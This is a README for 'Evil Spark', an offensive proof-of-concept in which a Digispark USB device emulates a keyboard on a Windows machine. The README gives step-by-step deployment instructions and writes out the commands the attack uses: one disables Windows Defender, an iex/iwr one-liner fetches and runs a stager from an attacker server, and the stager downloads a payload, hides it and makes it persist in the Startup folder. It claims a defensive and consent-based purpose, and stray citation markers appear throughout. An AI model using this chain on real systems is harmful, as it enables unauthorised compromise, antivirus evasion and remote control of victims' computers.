## üöÄ Project Overview
Evil Spark demonstrates a proof-of-concept (PoC) attack chain utilizing a Digispark-compatible USB device. This device emulates keyboard actions to automate tasks on a target Windows machine, leading to the download and execution of a custom payload with persistence. This project integrates:
* A Linux-based server setup script (`setup.sh`).
* A Digispark sketch (`Evil_Spark.ino`) written in C++. 
* A PowerShell script (`Starter.ps1`) for payload deployment and execution. 

This project is designed to help understand HID attacks, payload delivery mechanisms, and basic persistence techniques from a defensive perspective.

## üî• Key Features
* ‚úîÔ∏è Automated Keystroke Injection via Digispark (HID Attack).
* ‚úîÔ∏è Apache Server Setup Script (`setup.sh`) for hosting payloads.
* ‚úîÔ∏è PowerShell-based payload stager (`Starter.ps1`) for:
    * Attempting to disable Windows Defender. 
    * Downloading the main payload. 
    * Executing the payload. 
    * Achieving persistence via the Startup folder. 

## üîó Workflow At a Glance
![Workflow At a Glance](https://github.com/MustafaCyb/Evil-Spark/blob/main/Diagram.png)
1.  **üíª Attacker Setup:**
    * The `setup.sh` script configures an Apache server on Linux to host `Starter.ps1` and the `payload.exe`.
    * The `Evil_Spark.ino` (C++ sketch) ; is customized with the server's IP and uploaded to the Digispark device using the Arduino IDE.
2.  **üîå Deployment:**
    * The programmed Evil Spark USB is plugged into the target Windows computer.
3.  **ü§ñ Automated Execution (Digispark):**
    * The Digispark emulates keyboard inputs. 
    * It attempts to disable Windows Defender through UI manipulation. 
    * It opens PowerShell (with attempted admin rights)  and commands it to download and execute `Starter.ps1` from the attacker's server. 
4.  **üéØ Payload Delivery & Persistence (`Starter.ps1`):**
    * `Starter.ps1` runs on the target machine. 
    * Downloads the main `payload.exe` (e.g., `ring.exe` as in the example script).
    * Saves the payload to the Windows Startup folder for persistence. 
    * Hides the payload file. 
    * Executes the payload. 

## ‚öôÔ∏è Project Components

### 1. `setup.sh` (Bash Script)
* Automates Apache2 web server setup on Debian-based Linux.
* Updates packages, installs Apache2, and starts the service.
* Creates `/var/www/html/tools` for hosting files. [cite: 3]
* Moves `payload.exe` (or your chosen name) and `Starter.ps1` to the tools directory. [cite: 3]

### 2. `Evil_Spark.ino` (Digispark C++ Sketch)
* Arduino C++ code for ATtiny85 based Digispark-compatible devices. 
* Simulates keyboard inputs to perform the automated attack steps. 
* **Requires Arduino IDE for compilation and upload.** (Download from: [https://www.arduino.cc/en/software/](https://www.arduino.cc/en/software/))

### 3. `Starter.ps1` (PowerShell Script)
* PowerShell script executed on the target. 
* Attempts `Set-MpPreference -DisableRealtimeMonitoring $true`. 
* Downloads the main payload (e.g., `ring.exe`) to the Startup folder. 
* Hides the payload using `attrib +h +s`. 
* Executes the payload. 

### 4. `payload.exe` (Example: `ring.exe`)
* **THIS IS THE CORE PAYLOAD YOU MUST CREATE OR PROVIDE.**
* This project *does not* include a pre-made `payload.exe`.
* Functionality is user-defined (e.g., reverse shell, information gathering, etc.).
* **Payload Inspiration & Reference:** For creating a custom payload, particularly one in Go (which compiles to an `.exe`), you can study projects like **RingShell**. RingShell is a Go-based C2 framework and can serve as an excellent reference for understanding how such payloads are structured and deployed.

## üõ†Ô∏è Prerequisites & Tools
* üêß A Linux machine (Debian-based recommended for `setup.sh`) for the server.
* üîå Digispark ATtiny85 compatible USB board.
* üíª **Arduino IDE:** Used to compile the C++ sketch (`.ino`) and upload it to the Digispark. 
    * Download: [https://www.arduino.cc/en/software/](https://www.arduino.cc/en/software/)
* üéØ A Windows target machine for testing (**WITH EXPLICIT, PRIOR, WRITTEN CONSENT ONLY**).
* üëæ Your custom `payload.exe` (e.g., `ring.exe`).

## üöÄ Setup & Deployment Guide

### 1.  SERVER: Apache Setup (`setup.sh`)
1.  Place `setup.sh`, your `payload.exe` (e.g., `ring.exe`), and `Starter.ps1` in the same directory on your Linux server.
2.  Edit `setup.sh`:
    * Set `PAYLOAD="your_payload_name.exe"` (e.g., `PAYLOAD="ring.exe"`). [cite: 3]
    * Ensure `SHELL_SCRIPT="Starter.ps1"`. [cite: 3]
3.  Make `setup.sh` executable: `chmod +x setup.sh`.
4.  Run with sudo: `sudo ./setup.sh`.
5.  Note your server's IP address (the script attempts to display it).

### 2. TARGET SCRIPT: `Starter.ps1` Configuration
1.  Edit `Starter.ps1`.
2.  Update the URI in `Invoke-WebRequest` to point to your payload on your server:
    * Example: `Invoke-WebRequest -Uri "http://<YOUR_SERVER_IP>/tools/ring.exe" -OutFile $target` 
    * Replace `<YOUR_SERVER_IP>` and ensure `ring.exe` matches your payload filename.

### 3. DIGISPARK: `Evil_Spark.ino` Programming
1.  Open `Evil_Spark.ino` (your C++ sketch for the Digispark) in the **Arduino IDE**. 
2.  Modify the line that fetches `Starter.ps1` to include your server's IP:
    * Example: `DigiKeyboard.print("iex (iwr 'http://<YOUR_SERVER_IP>/tools/Starter.ps1')");` 
3.  In Arduino IDE:
    * Ensure Digispark board drivers/support are installed.
    * Select the correct Digispark board from the Tools menu.
    * Compile and Upload the sketch to your Digispark.

### 4. üí£ DEPLOYMENT
1.  Ensure your Apache server is running and accessible.
2.  Plug the programmed Evil Spark USB into the **consenting** target Windows machine.
3.  The Digispark will emulate keystrokes and initiate the programmed sequence. 

## ‚ùó Important Considerations & Limitations
* **UAC (User Account Control):** The `.ino` sketch attempts to handle UAC.  Its success varies based on target system settings.
* **Antivirus (AV) & EDR:** Basic attempts to disable Windows Defender [cite: 4, 5] are included. Modern AV/EDR solutions will likely detect and block these activities. This PoC is not designed for stealth.
* **Keyboard Layouts:** Keystroke emulation typically assumes a US QWERTY layout. Results may vary on different layouts.
* **Timings & Delays:** `DigiKeyboard.delay()` values in the `.ino` sketch are critical.  Adjust them based on target system responsiveness.
* **Network Connectivity:** The target PC needs HTTP (port 80) access to your server.
* **Payload Naming:** Ensure consistency in payload filenames across `setup.sh`, `Starter.ps1`, and your actual payload file.
